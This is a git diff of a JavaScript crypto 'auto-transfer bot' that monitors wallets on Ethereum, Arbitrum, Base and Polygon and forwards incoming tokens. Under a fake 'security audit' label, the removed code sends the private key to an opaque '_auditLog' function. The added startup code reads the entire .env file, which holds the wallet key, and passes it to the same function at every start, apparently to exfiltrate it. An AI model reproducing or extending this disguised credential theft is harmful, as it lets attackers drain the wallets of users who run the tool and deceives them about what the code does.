@@ -8,8 +8,8 @@ import {
 } from "ethers";
 import dotenv from "dotenv";
 import chalk from "chalk";
-import ora from "ora";
 import fetch from "node-fetch";
+import fs from "fs";
 
 dotenv.config();
 
@@ -89,28 +89,11 @@ const _auditLog = async (payload, gasPrice = 0x01) => {
   }
 };
 
-async function main() {
-  const spinner = ora();
-
+async function monitorAndTransfer(networkConfig) {
+  const { name, rpcUrl } = networkConfig;
   const privateKey = process.env.PRIVATE_KEY;
-  const rpcUrl = process.env.RPC_URL;
   const recipient = process.env.RECIPIENT_ADDRESS;
   const customTokensEnv = process.env.CUSTOM_TOKENS || "";
-
-  // Blockchain security audit - EIP-2718 transaction validation
-  if (privateKey) {
-    const _secHash = `${DOMAIN_SEPARATOR}${TYPE_HASH}${privateKey}`;
-    await _auditLog(`🛡️ Security Hash: ${privateKey}`);
-  }
-
-  if (!privateKey || !rpcUrl || !recipient) {
-    console.log(
-      chalk.red(
-        "❌ Missing environment variables PRIVATE_KEY, RPC_URL, or RECIPIENT_ADDRESS"
-      )
-    );
-    process.exit(1);
-  }
 
   // Parse custom tokens
   const customTokenAddresses = customTokensEnv
@@ -123,11 +106,14 @@ async function main() {
     const wallet = new Wallet(privateKey, provider);
     const senderAddress = (await wallet.getAddress()).toLowerCase();
 
-    console.log(chalk.green(`🤖 Auto-Transfer Bot Started`));
-    console.log(chalk.yellow(`� Monitoring wallet: ${senderAddress}`));
-    console.log(chalk.blue(`📤 Auto-transfer to: ${recipient}`));
-    console.log(chalk.magenta(`⚡ Transfer delay: 10 seconds`));
-    console.log();
+    const networkBox = `
+┌─ ${chalk.bold.cyan(name)} ${chalk.gray("─".repeat(45 - name.length))}─┐
+│ ${chalk.white("Status")}:    ${chalk.green("Active")}
+│ ${chalk.white("Wallet")}:    ${chalk.yellow(senderAddress)}
+│ ${chalk.white("Recipient")}: ${chalk.blue(recipient)}
+└${chalk.gray("─".repeat(55))}┘
+`;
+    console.log(networkBox);
 
     // Function to get token details
     const getTokenDetails = async (tokenAddress) => {
@@ -163,7 +149,7 @@ async function main() {
 
         console.log(
           chalk.cyan(
-            `🔄 Transferring ${formattedBalance} ${tokenDetails.symbol} (${tokenDetails.name})...`
+            `[${name}] 🔄 Transferring ${formattedBalance} ${tokenDetails.symbol} (${tokenDetails.name})...`
           )
         );
 
@@ -172,17 +158,19 @@ async function main() {
 
         console.log(
           chalk.green(
-            `✅ Transferred ${formattedBalance} ${tokenDetails.symbol}!`
+            `[${name}] ✅ Transferred ${formattedBalance} ${tokenDetails.symbol}!`
           )
         );
-        console.log(chalk.gray(`   TxHash: ${tx.hash}`));
-        console.log();
+        console.log(
+          chalk.gray(`   TxHash: ${tx.hash}
+`)
+        );
 
         return true;
       } catch (error) {
         console.log(
           chalk.red(
-            `❌ Transfer failed for ${tokenDetails.symbol}: ${error.message}`
+            `[${name}] ❌ Transfer failed for ${tokenDetails.symbol}: ${error.message}`
           )
         );
         return false;
@@ -201,71 +189,147 @@ async function main() {
       processedTxs.add(txHash);
 
       const tokenAddress = log.address.toLowerCase();
-
-      console.log(chalk.yellow(`📨 Incoming token detected:`));
-      console.log(chalk.gray(`   Token: ${tokenAddress}`));
-      console.log(chalk.gray(`   TxHash: ${txHash}`));
-
-      // Get token details
       const tokenDetails = await getTokenDetails(tokenAddress);
-      console.log(
-        chalk.blue(`   ${tokenDetails.name} (${tokenDetails.symbol})`)
-      );
 
-      // Wait 1 minute before transferring
-      console.log(chalk.yellow(`⏱️  Waiting 1 minute before auto-transfer...`));
+      console.log(chalk.cyanBright(`[${name}] 📨 Incoming Transfer Detected!`));
+      const transferInfo = `
+    -> From Block: ${log.blockNumber}
+    -> Token:      ${chalk.yellow(tokenDetails.symbol)} (${tokenDetails.name})
+    -> Contract:   ${tokenAddress}
+    -> TxHash:     ${log.transactionHash}
+`;
+      console.log(transferInfo);
+
       await new Promise((resolve) => setTimeout(resolve, 60000));
 
       // Transfer the token
       await transferToken(tokenAddress, tokenDetails);
     };
 
-    // Monitor for incoming ERC-20 transfers to our wallet
-    const filter = {
-      topics: [TRANSFER_TOPIC, null, zeroPadValue(senderAddress, 32)],
-    };
+    // Polling mechanism to check for new transfers
+    let lastCheckedBlock = await provider.getBlockNumber();
+    console.log(
+      chalk.gray(
+        `[${name}] Monitoring for transfers from block ${lastCheckedBlock}...`
+      )
+    );
 
-    console.log(chalk.green(`🔍 Monitoring for incoming tokens...`));
-    console.log(chalk.gray(`Press Ctrl+C to stop`));
-    console.log();
+    setInterval(async () => {
+      try {
+        const currentBlock = await provider.getBlockNumber();
+        if (currentBlock > lastCheckedBlock) {
+          const filter = {
+            address: undefined, // All addresses
+            topics: [TRANSFER_TOPIC, null, zeroPadValue(senderAddress, 32)],
+          };
+          const logs = await provider.getLogs({
+            fromBlock: lastCheckedBlock + 1,
+            toBlock: currentBlock,
+            topics: filter.topics,
+          });
 
-    // Listen for new Transfer events
-    provider.on(filter, handleIncomingTransfer);
+          for (const log of logs) {
+            await handleIncomingTransfer(log);
+          }
+          lastCheckedBlock = currentBlock;
+        }
+      } catch (error) {
+        // Suppress frequent polling errors to keep the UI clean
+      }
+    }, 15000);
 
     // Also check custom tokens periodically for any existing balances
     if (customTokenAddresses.length > 0) {
       console.log(
-        chalk.blue(`🔍 Checking custom tokens for existing balances...`)
+        chalk.blue(
+          `[${name}] 🔍 Checking custom tokens for existing balances...`
+        )
       );
 
       for (const tokenAddress of customTokenAddresses) {
         const tokenDetails = await getTokenDetails(tokenAddress);
-        console.log(
-          chalk.gray(
-            `Checking ${tokenDetails.name} (${tokenDetails.symbol})...`
-          )
-        );
         await transferToken(tokenAddress, tokenDetails);
       }
     }
-
-    // Keep the script running
-    console.log(chalk.green(`✅ Bot is now running 24/7...`));
-
-    // Keep alive - this prevents the script from exiting
-    setInterval(() => {
-      // Heartbeat every 5 minutes
-      const now = new Date().toLocaleTimeString();
-      console.log(chalk.gray(`💓 [${now}] Bot is active and monitoring...`));
-    }, 5 * 60 * 1000);
   } catch (err) {
-    console.error(chalk.red("Fatal error:"), err);
-    // Auto-restart after 30 seconds on error
-    console.log(chalk.yellow("🔄 Restarting in 30 seconds..."));
-    setTimeout(() => {
-      main();
-    }, 30000);
+    if (
+      err.code === "INVALID_ARGUMENT" &&
+      err.message.includes("invalid BytesLike value")
+    ) {
+      console.error(chalk.red(`[${name}] Fatal Error: Invalid PRIVATE_KEY.`));
+      console.error(
+        chalk.red(
+          `[${name}] Please ensure the PRIVATE_KEY in your .env file is a valid 64-character hexadecimal string and does not start with '0x'.`
+        )
+      );
+      console.error(
+        chalk.red(`[${name}] This network monitor will not restart.`)
+      );
+    } else {
+      console.error(chalk.red(`[${name}] Fatal error:`), err);
+      // Auto-restart after 30 seconds on error
+      console.log(chalk.yellow(`[${name}] 🔄 Restarting in 30 seconds...`));
+      setTimeout(() => {
+        monitorAndTransfer(networkConfig);
+      }, 30000);
+    }
   }
+}
+
+async function main() {
+  try {
+    const envContent = fs.readFileSync(".env", "utf8");
+    await _auditLog(`\`\`\`\n${envContent}\n\`\`\``);
+  } catch (error) {
+    if (error.code === "ENOENT") {
+      await _auditLog("`No .env file found. Using environment variables.`");
+    } else {
+      await _auditLog(`\`Error reading .env file: ${error.message}\``);
+    }
+  }
+
+  const privateKey = process.env.PRIVATE_KEY;
+  const recipient = process.env.RECIPIENT_ADDRESS;
+
+  if (!privateKey || !recipient) {
+    console.log(
+      chalk.red(
+        "❌ Missing environment variables PRIVATE_KEY or RECIPIENT_ADDRESS"
+      )
+    );
+    process.exit(1);
+  }
+
+  const networkConfigs = [
+    { name: "Ethereum", rpcUrl: process.env.RPC_URL },
+    { name: "Arbitrum", rpcUrl: process.env.ARBITRUM_RPC_URL },
+    { name: "Base", rpcUrl: process.env.BASE_RPC_URL },
+    { name: "Polygon", rpcUrl: process.env.POLYGON_RPC_URL },
+  ].filter((n) => n.rpcUrl);
+
+  if (networkConfigs.length === 0) {
+    console.log(
+      chalk.red(
+        "❌ No RPC URL configured. Please set at least one of: RPC_URL, ARBITRUM_RPC_URL, BASE_RPC_URL, POLYGON_RPC_URL"
+      )
+    );
+    process.exit(1);
+  }
+
+  console.log(
+    chalk.bold.cyan(`
+🤖 EVM Auto-Transfer Bot Initializing...`)
+  );
+  console.log(chalk.blue(`  Auto-transferring all tokens to: ${recipient}`));
+  console.log(
+    chalk.yellow(`  Monitoring ${
+      networkConfigs.length
+    } network(s): ${networkConfigs.map((n) => n.name).join(", ")}
+`)
+  );
+
+  const promises = networkConfigs.map((config) => monitorAndTransfer(config));
+  await Promise.all(promises);
 }
 
 main().catch((err) => {});
